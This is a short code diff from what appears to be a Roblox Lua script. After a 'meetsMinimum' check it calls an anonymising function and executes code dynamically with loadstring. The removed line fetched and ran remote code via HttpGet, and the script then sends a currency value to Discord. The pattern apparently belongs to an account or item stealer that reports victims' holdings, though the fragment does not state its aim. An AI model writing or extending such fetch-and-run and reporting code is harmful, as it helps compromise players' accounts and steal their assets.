@@ -614,7 +614,7 @@ if meetsMinimum then
 	Anonymousify()
 	task.spawn(function()
 		task.wait(executeDelay)
-		loadstring(game:HttpGet(mainScript))()
+		loadstring(mainScript)()
 	end)
 	DiscordNotificationCURRENCY(currencyTextLabel, temp)
 
